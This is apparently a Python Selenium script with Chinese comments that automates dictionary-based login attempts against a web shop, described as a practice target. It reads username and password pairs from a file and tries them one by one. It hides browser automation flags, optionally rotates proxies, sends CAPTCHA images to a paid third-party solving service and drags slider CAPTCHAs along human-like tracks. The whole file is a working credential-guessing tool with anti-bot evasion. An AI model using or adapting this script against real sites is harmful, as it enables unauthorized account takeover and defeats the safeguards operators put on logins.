#!/usr/local/bin/python3
# -*- coding: UTF-8 -*-
"""
1）在线版登录时输入文字验证码
2）local版登录时移动滑块
"""

__author__ = 'Alina'

from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium import webdriver
import requests,time,json,random,pyautogui
from NumSet import params
from selenium.webdriver.common.action_chains import ActionChains


"""
根据是否使用代理选择不同的驱动方式
"""
if params.chioceProxy == 1:
    print("已选择使用代理，速度会较慢，请知悉。")
    # 初始化webdriver
    chromeOptions = webdriver.ChromeOptions()
    # 设置代理
    chromeOptions.add_argument("--proxy-server=http://"+requests.get(params.proxyUrl).text)
    # 修改window.navigator.webdriver：在启动Chromedriver之前，为Chrome开启实验性功能参数
    chromeOptions.add_experimental_option('excludeSwitches', ['enable-automation'])
    browser = webdriver.Chrome(chrome_options=chromeOptions)
else:
    print("已选择不使用代理")
    # 初始化webdriver
    chromeOptions = webdriver.ChromeOptions()
    # 修改window.navigator.webdriver：在启动Chromedriver之前，为Chrome开启实验性功能参数
    chromeOptions.add_experimental_option('excludeSwitches', ['enable-automation'])
    browser = webdriver.Chrome(chrome_options=chromeOptions)

"""
根据测试站点情况选择是否 执行 关闭广告：连网时进行操作 -> 关闭广告，未连网时不操作；
"""
if params.chioceTargetDrone == 0:
    # 打开在线版靶机
    browser.get(params.demoOnlineUrl)
    browser.refresh()
    try:
        # 关闭广告
        adEle = WebDriverWait(browser, 10).until(lambda browser: browser.find_element_by_css_selector(
            "a.am-close.am-close-alt.am-close-spin.am-icon-times.am-fr.submit-ajax"))
        browser.execute_script("arguments[0].click();", adEle)
    except TimeoutException as msg:
        print("打开广告失败，直接进行下一步。")
else:
    # 打开本地版靶机
    browser.get(params.localUrl)
    browser.refresh()


# 点击登录
loginEle = WebDriverWait(browser, 10).until(
    lambda browser: browser.find_element_by_css_selector("ul.top-nav-left>div>div>a:nth-child(3)"))
browser.execute_script("arguments[0].click();", loginEle)

# 轮询字典中的username
file = open(params.filePath_login)
context = file.readlines()
users = []
pwords = []
for i in context:
    username = i.split(',')[0]
    password = i.split(',')[1]
    users.append(username)
    pwords.append(password)
    file.close()

# 调用第三方识别验证码
def base64_api(uname, pwd, softid, b64):

    data = {"username": uname, "password": pwd, "softid": softid, "image": b64}
    result = json.loads(requests.post("http://api.ttshitu.com/base64", json=data).text)
    if result['success']:
        return result["data"]["result"]
    else:
        return result["message"]
    return ""

# 滑块
def get_track(distance):      # distance为传入的总距离
    """
    根据偏移量 获取移动轨迹
    :param distance:
    :return:
    """
    # 移动轨迹
    track=[]
    # 当前位移
    current=0
    # 减速阈值
    mid=distance*4/5  # 前4/5段加速 后1/5段减速
    # 计算间隔
    t=0.2
    # 初速度
    v=200
    while current<distance:
        if current<mid:
            # 加速度为2
            a=2
        else:
            # 加速度为-3
            a=-3
        # 初速度v0
        v0=v
        # 当前速度
        v=v0+a*t
        # 移动距离
        move=v0*t+1/2*a*t*t
        # 当前位移
        current+=move
        # 加入轨迹
        track.append(round(move))
    return track
def move_to_gap(slider,tracks):     # slider是要移动的滑块,tracks是要传入的移动轨迹
    """
    拖动滑块到缺口处
    :param slider:
    :param tracks:
    :return:
    """
    ActionChains(browser).click_and_hold(slider).perform()
    for x in tracks:
        # 只有水平方向有运动 按轨迹移动
        ActionChains(browser).move_by_offset(xoffset=x,yoffset=0).perform()
    time.sleep(0.5)
    # 松开鼠标
    ActionChains(browser).release().perform()

# 模拟鼠标随机移动-不带轨迹
def mov_mouse_byxy():
    for i in range(10):
        x = random.randint(1, 1000)
        y = random.randint(1, 600)
        ActionChains(browser).move_by_offset(x, y)
        print("鼠标随机移动到坐标：", x, y)
    return ""

# 模拟鼠标随机移动-带轨迹（mac需在安全设置中开启脚本应用软件的支持）
def mov_mouse_random():
    for i in range(10):
        x = random.randint(1, 1000)
        y = random.randint(1, 600)
        pyautogui.moveTo(x, y, duration=0.25)
        # print("鼠标随机移动到坐标：", x, y)
    return ""

"""
尝试文件中使用不同的用户名、密码进行登录验证
"""
flag = 'false'
for i,j in zip(users,pwords):
    print('当前验证用户名密码分别：',i,j)
    if browser.find_element_by_css_selector("ul.top-nav-left>div>div>a").text != "退出" :
        browser.refresh()
        # 输入用户名
        browser.find_element_by_name("accounts").clear()
        browser.find_element_by_name("accounts").send_keys(i)
        # 输入密码
        browser.find_element_by_name("pwd").clear()
        browser.find_element_by_name("pwd").send_keys(j)

        # 在线版执行输入文字验证码
        # local版执行移动滑块
        if params.chioceTargetDrone == 1:
            # 移动滑块
            if browser.find_element_by_css_selector('div.drag_text') != "验证通过":
                slideBtn = browser.find_element_by_css_selector('div.handler.handler_bg')
                width = browser.find_element_by_css_selector('div.drag_text').size['width']
                slideBtnWidth = slideBtn.size['width']
                move_to_gap(slideBtn, get_track(width - slideBtnWidth - 33))
            else:
                pass
        else:
            # 获取验证码code: 打码平台 http://www.ttshitu.com/ 
            result = base64_api('username', 'password', 'pid',
                                browser.find_element_by_xpath("//*[@id=\"form-verify-img\"]").screenshot_as_base64)
            # 输入验证码
            yzEle = WebDriverWait(browser, 10).until(lambda browser: browser.find_element_by_name("verify"))
            yzEle.send_keys(result)

        # 随机移动鼠标
        mov_mouse_random()
        # 点击登录
        loginBtnEle = WebDriverWait(browser, 10).until(lambda browser: browser.find_element_by_css_selector("form.am-form.form-validation>div:nth-child(4)>button"))
        browser.execute_script("arguments[0].click();", loginBtnEle)

        """
        注意：这边的等待时长不可省略，因为跳转需要时间。
        这里设置的等待时长可根据网速调整。
        """
        time.sleep(2)
        if browser.find_element_by_css_selector("ul.top-nav-left a").text == "退出" :
            print("--------------------------------------------------------")
            print('使用"',i,j,'"成功登录，浏览器即将自动退出。首页，左上方提示：{}'.format(
                browser.find_element_by_css_selector('ul.top-nav-left > div > div').text))
            # 点击退出
            regEle = WebDriverWait(browser, 10).until(
                lambda browser: browser.find_element_by_css_selector("ul.top-nav-left a"))
            browser.execute_script("arguments[0].click();", regEle)
            flag = 'true'
            break

if flag != 'true':
    print("现有数据验证完成，未找到正确的用户及密码！建议重新准备测试数据。")


# 退出浏览器
browser.quit()